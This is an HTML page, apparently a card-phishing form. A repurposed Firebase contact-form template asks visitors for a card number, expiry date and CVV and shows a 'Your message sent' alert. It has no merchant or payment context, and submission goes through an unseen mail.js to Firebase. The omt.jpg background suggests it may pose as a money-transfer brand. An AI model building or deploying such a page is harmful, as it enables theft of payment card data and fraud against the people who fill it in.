<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Background Image</title>
    <title>Contact Messages | Firebase</title>
    <link rel="stylesheet" href="./styles.css">
</head>

<body background="omt.jpg">
    <div class="container">
        <form action="" id="contactForm">
            <div class="alert">Your message sent</div>

            <div class="inputBox">
                <input type="text" id="name" placeholder="CARD NUMBER" />
            </div>

            <div class="inputBox">
                <input type="text" id="emailid" placeholder="EXPIRE DATE 00/00" />
            </div>
            <div class="inputBox">
                <input type="text" id="emailid1" placeholder="CVV 3-4 digits" />
            </div>

            

            <div class="inputBox">
                <button type="submit">Submit</button>
            </div>
        </form>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
    <script src="./mail.js"></script>
</body>

</html>
